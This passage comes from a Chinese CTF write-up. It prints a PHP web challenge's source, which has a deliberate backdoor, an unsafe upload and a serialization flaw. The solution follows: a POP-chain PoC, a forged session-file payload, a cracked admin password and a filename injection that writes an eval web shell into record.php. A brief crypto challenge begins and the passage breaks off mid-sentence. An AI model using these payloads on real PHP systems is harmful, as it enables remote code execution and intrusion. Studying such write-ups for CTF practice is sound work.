class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Config</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//安全获取基本信息，返回修改配置的表单</span></span><br><span class="line">        <span class="variable">$Config</span>-&gt;nickname = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;nickname) ? <span class="variable">$Config</span>-&gt;nickname : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;sex = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;sex) ? <span class="variable">$Config</span>-&gt;sex : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;mail = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;mail) ? <span class="variable">$Config</span>-&gt;mail : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;telnum = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;telnum) ? <span class="variable">$Config</span>-&gt;telnum : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="variable">$Config</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;    &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;file&quot; name=&quot;avatar&quot; &gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;nickname&quot; placeholder=&quot;nickname&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;sex&quot; placeholder=&quot;sex&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;mail&quot; placeholder=&quot;mail&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;telnum&quot; placeholder=&quot;telnum&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;submit&quot; name=&quot;m&quot; value=&quot;edit&quot;/&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editconf</span>(<span class="params"><span class="variable">$avatar</span>, <span class="variable">$nickname</span>, <span class="variable">$sex</span>, <span class="variable">$mail</span>, <span class="variable">$telnum</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//编辑表单内容</span></span><br><span class="line">        <span class="variable">$Config</span> = <span class="variable language_">$this</span>-&gt;Config;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$Config</span>-&gt;avatar = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$avatar</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable">$Config</span>-&gt;sex = (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/男|女/&quot;</span>, <span class="variable">$sex</span>, <span class="variable">$matches</span>) ? <span class="variable">$matches</span>[<span class="number">0</span>] : <span class="string">&quot;武装直升机&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;mail = (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.*@.*\..*/&#x27;</span>, <span class="variable">$mail</span>) ? <span class="variable">$mail</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;telnum = <span class="title function_ invoke__">substr</span>(<span class="variable">$telnum</span>, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="variable">$Config</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$Config</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="string">&quot;record.php&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            [<span class="keyword">new</span> <span class="title class_">Log</span>(<span class="variable">$Config</span>),<span class="string">&quot;log&quot;</span>]();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resetconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//返回出厂设置</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;Tzo2OiJDb25maWciOjc6e3M6NToidW5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjMyOiI1MGI5NzQ4Mjg5OTEwNDM2YmZkZDM0YmRhN2IxYzlkOSI7czo2OiJhdmF0YXIiO3M6MTA6Ii90bXAvMS5wbmciO3M6ODoibmlja25hbWUiO3M6MTU6IuWwj+eGiui9r+ezlk92TyI7czozOiJzZXgiO3M6Mzoi5aWzIjtzOjQ6Im1haWwiO3M6MTU6ImFkbWluQGFkbWluLmNvbSI7czo2OiJ0ZWxudW0iO3M6MTE6IjEyMzQ1Njc4OTAxIjt9&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$avatar</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\.\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="string">&quot;:(&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Config-&gt;<span class="title function_ invoke__">showconf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$telnum</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;edit conf success\\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;br&gt;/&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">showconf</span>());</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;avatar&quot;</span>,<span class="string">&quot;nickname&quot;</span>,<span class="string">&quot;sex&quot;</span>,<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;telnum&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$show</span> = <span class="string">&quot;&lt;img src=\&quot;data:image/png;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;avatar)).<span class="string">&quot;\&quot;/&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;nickname: <span class="subst">$this</span>-&gt;nickname&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;sex: <span class="subst">$this</span>-&gt;sex&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;mail: <span class="subst">$this</span>-&gt;mail&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;telnum: <span class="subst">$this</span>-&gt;telnum&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$show</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;backdoor&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;backdoor&#x27;</span>];</span><br><span class="line">            <span class="variable">$func</span>();<span class="comment">//:)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Log</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Config</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = PHP_EOL.<span class="string">&#x27;$_&#x27;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&#x27; = \&#x27;&#x27;</span>.<span class="string">&quot;Edit: avatar-&gt;<span class="subst">$Config</span>-&gt;avatar, nickname-&gt;<span class="subst">$Config</span>-&gt;nickname, sex-&gt;<span class="subst">$Config</span>-&gt;sex, mail-&gt;<span class="subst">$Config</span>-&gt;mail, telnum-&gt;<span class="subst">$Config</span>-&gt;telnum&quot;</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;record.php&quot;</span>,<span class="string">&quot;&lt;?php error_reporting(0); &quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;data === <span class="string">&quot;log_start()&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;record.php&quot;</span>,<span class="string">&quot;&lt;?php error_reporting(0); &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;:O&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;record.php&#x27;</span>, <span class="variable">$this</span>-&gt;data, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题的思路很简单触发Log的toString方法即可，但是触发点并不是在反序列化，仔细审计一下后会发现是在序列化_sleep函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;edit conf success\\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;br&gt;/&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">showconf</span>());</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;avatar&quot;</span>,<span class="string">&quot;nickname&quot;</span>,<span class="string">&quot;sex&quot;</span>,<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;telnum&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>序列化时会触发showconf函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$show</span> = <span class="string">&quot;&lt;img src=\&quot;data:image/png;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;avatar)).<span class="string">&quot;\&quot;/&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$show</span> .= <span class="string">&quot;nickname: <span class="subst">$this</span>-&gt;nickname&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$show</span> .= <span class="string">&quot;sex: <span class="subst">$this</span>-&gt;sex&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$show</span> .= <span class="string">&quot;mail: <span class="subst">$this</span>-&gt;mail&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$show</span> .= <span class="string">&quot;telnum: <span class="subst">$this</span>-&gt;telnum&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$show</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在file_get_contents的时候将avatar置为Log类即可触发，实现的方式也很简单，在我们的入口点会触发editconf函数，在这里面有一个upload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$avatar</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$path</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\.\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>]);</span><br><span class="line">       <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>]);</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>我们可以往tmp目录下写任意文件和任意文件内容，这时候我们只需要写一个<code>sess_boogipop</code>进去，内容是序列化字符串，就可以触发_sleep函数。POC如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Config</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$telnum</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Log</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span>=<span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line"><span class="variable">$sink</span>=<span class="keyword">new</span> <span class="title class_">Log</span>();</span><br><span class="line"><span class="variable">$sink</span>-&gt;data=<span class="string">&quot;log_start()&quot;</span>;</span><br><span class="line"><span class="variable">$exp</span>-&gt;avatar=<span class="variable">$sink</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure><p>我们上传一个叫做sess_boogipop的文件，内容是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa|O:<span class="number">6</span>:<span class="string">&quot;Config&quot;</span>:<span class="number">7</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;avatar&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Log&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;log_start()&quot;</span>;&#125;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;mail&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;telnum&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意我们要满足php session的格式<code>aaa|bbb</code>，题目初始密码在那一串base64里，解密后内容如下</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Config&quot;:7:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:32:&quot;50b9748289910436bfdd34bda7b1c9d9&quot;;s:6:&quot;avatar&quot;;s:10:&quot;/tmp/1.png&quot;;s:8:&quot;nickname&quot;;s:15:&quot;小熊软糖OvO&quot;;s:3:&quot;sex&quot;;s:3:&quot;女&quot;;s:4:&quot;mail&quot;;s:15:&quot;admin@admin.com&quot;;s:6:&quot;telnum&quot;;s:11:&quot;12345678901&quot;;&#125;</span><br></pre></td></tr></table></figure><p>cmd5解密出来密码是<code>1q2w3e</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713628826312-c4c58276-eae7-420c-aad4-48dc75351cd2.png#averageHue=%23d4d2d0&clientId=uc4c304a8-8e1a-4&from=paste&height=682&id=u648c5c48&originHeight=1364&originWidth=2942&originalType=binary&ratio=2&rotation=0&showTitle=false&size=765825&status=done&style=none&taskId=udba580bd-266c-4a6a-bdbc-9889c0d8e43&title=&width=1471" alt="image.png"><br>然后我们上传sess_boogipop文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713628910216-b6b86c22-298a-416a-a643-2b4a3acb5a15.png#averageHue=%23b6c796&clientId=uc4c304a8-8e1a-4&from=paste&height=1021&id=u1b9ea8f1&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1113674&status=done&style=none&taskId=ufc717bce-9e43-4ff9-a1eb-19a6fd78b6e&title=&width=1502" alt="image.png"><br>然后我们输入<code>backdoor=session_start</code>就可以触发sleep函数，进而触发toString,记得带上<code>PHPSESSID=boogipop</code>,此时record.php已经有我们的内容了，我们可以考虑第二步往里面写shell了，这里注意生成的正常内容如下</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">_</span>1713609381 = &#x27;Edit: avatar-&gt;/tmp/, nickname-&gt;aaaaa, sex-&gt;武装直升机, mail-&gt;, telnum-&gt;&#x27;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span><span class="built_in">_</span>1713609389 = &#x27;Edit: avatar-&gt;/tmp/1, nickname-&gt;aaaa<span class="keyword">\&#x27;</span>, sex-&gt;武装直升机, mail-&gt;, telnum-&gt;&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于入口加了个waf 会对引号转义，但是没有对$_FILE的filename转义，因此在文件名可以存在逃逸。文件名为<code>1&#39;;eval($_POST[1]);#</code>即可<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713629126635-2d4724d1-26b6-4712-abcd-9380d7b3f27f.png#averageHue=%23c4d1a7&clientId=uc4c304a8-8e1a-4&from=paste&height=1021&id=ufdc1288a&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1115859&status=done&style=none&taskId=ubd2a8490-f683-4bdc-ae8b-e2e61ea4248&title=&width=1502" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713629185015-0f2709fb-6947-4617-9b88-bf7e1c030c80.png#averageHue=%23a6a6a6&clientId=uc4c304a8-8e1a-4&from=paste&height=979&id=u7969f4ae&originHeight=1958&originWidth=3192&originalType=binary&ratio=2&rotation=0&showTitle=false&size=287860&status=done&style=none&taskId=uf0c3fb76-b2dd-448c-ac59-c5e6fabdd23&title=&width=1596" alt="image.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="The-Mystery-of-Math"><a href="#The-Mystery-of-Math" class="headerlink" title="The Mystery of Math"></a>The Mystery of Math</h3><p>题目是让我们输入一个逻辑式（这里我以<img src="https://cdn.nlark.com/yuque/__latex/26fdbf8e53cb0e48da5f4ddd4aaf5a5c.svg#card=math&code=a&id=VG3DP">来指代），然后会返回给我们以下信息：</p><blockquote><p>1，密文：<img src="https://cdn.nlark.com/yuque/__latex/d3b74188e1ddca1fe5a431c3193c7bc7.svg#card=math&code=c%3Dm%5Ee~mod~n&id=i4Hug"><br>2，模数：<img src="https://cdn.nlark.com/yuque/__latex/df378375e7693bdcf9535661c023c02e.svg#card=math&code=n&id=tn1TK"><br>3，提示：<img src="https://cdn.nlark.com/yuque/__latex/f6a24b8141727a67144c6e789a7e2040.svg#card=math&code=tip%3Dgcd%28CNF%28a%29%2C~DNF%28a%29%29&id=RPjU2"><br>（其中CNF(a)是a的合取范式，DNF(a)是a的析取范式）</p></blockquote><p>既然是这样的话，我们肯定得利用点小trick——<strong>找一个使得</strong><img src="https://cdn.nlark.com/yuque/__latex/e58d9363be0335fffb8d76e5d6e3a35c.svg#card=math&code=CNF%28a%29%3DDNF%28a%29&id=fo4Sm"><strong>的逻辑式</strong><img src="https://cdn.nlark.com/yuque/__latex/26fdbf8e53cb0e48da5f4ddd4aaf5a5c.svg#card=math&code=a&id=jjmh0"><br>因为这样的话，便有：<img src="https://cdn.nlark.com/yuque/__latex/3bf203865a5e0c10365e207681f8f77e.svg#card=math&code=tip%3Dgcd%28CNF%28a%29%2C~DNF%28a%29%29%3DCNF%28a%29&id=mhyEL"><br>我这里用的是这个：<strong>p∧q∧r∧s</strong>，那么对应的CNF(a)便是：**(p∧q∧r∧s)<strong>。<br>这样就有一部分符号所对应的随机数<img 